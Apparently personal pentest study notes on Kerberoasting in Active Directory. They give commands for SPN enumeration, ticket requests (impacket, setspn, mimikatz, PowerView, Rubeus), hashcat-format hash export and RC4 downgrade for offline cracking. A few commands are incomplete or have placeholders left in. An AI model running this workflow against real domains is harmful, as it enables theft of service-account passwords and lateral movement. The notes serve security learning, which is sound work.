<p align="justify">**Kerberoasting** is a **privilege escalation** and **lateral movement** attack technique used in **Active Directory (AD)** environments. It targets **Service Principal Names (SPNs)**, which are unique identifiers used by the **Kerberos authentication protocol** to associate a service with a service account.</p>

![[Pasted image 20250314232308.png]]
### What is an SPN:
- A **Service Account** is a special **user account** in **Active Directory (AD)** that is used to run a **service** or **application** instead of a regular user account.
- A **Service Principal Name (SPN)** is a unique identifier that maps a **service** to a **service account**.

### Requirements:
- Need to have a valid username and password for Authentication
- The target system uses **Active Directory** for authentication

 <p align="justify">**Any authenticated domain user** can **search for SPNs** in an Active Directory (AD) environment. This is because **querying SPNs is a low-privilege action**, and **Kerberos allows any domain user to request a service ticket (TGS) for any SPN**.**SPNs are stored in Active Directory**, any **authenticated domain user** can query **all service accounts with SPNs**â€”regardless of which host they belong to.</p>
 

### Working
#### 1.SPN Enumeration:
- For windows u can use Powershell or setspn.exe built in binary

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name, ServicePrincipalName
```

```
setspn -Q */*
```

- For Linux  host we can use impacket library
```
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DomainControllerIP>
```

#### 2.Request a Kerberos Ticket for an SPN
- Windows
```
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object <OBJECT_TYPE> -Property @{ <PROPERTY_NAME> = $_ } }
```
- Linux
```
GetUserSPNs.py -dc-ip <ip-of-dc> <Domain_name>/<user> -request
```

#### 3.Extract and Save the Ticket
```
mimikatz.exe "kerberos::list /export" exit
```

#### 4.Crack the Ticket Offline


- The  Kerberos **Ticket Granting Service (TGS) tickets** extracted via **Kerberoasting** are typically encrypted with the NTLM hash of the service account** that owns the **Service Principal Name (SPN)**.
- if we can crack them we can get the password of the service account


### Using Power view
- using Powerview to extract the TGS tickets
```
Get-DomainUser * -spn | select samaccountname
```
- We can use powerviw to target a specific user and Retrieve the TGS ticket in hashcat format
```
Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
```
- Exporting all tickets into CSV file
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv <output_file.csv> -NoTypeInformation
```

### Using Rubeus
- provides a statistical summary of the Kerberos service tickets found on the system.
```
.\Rubeus.exe kerberoast /stats
```

- Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES 256. 
- When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$* , an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$* .
- While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.

- powerview command to check the suported encryption types
```
Get-DomainUser <username> -Properties
```

- if more than one encryption type is supported we can use a flag to request a ticket of specific encryption
```
/tgtdeleg
```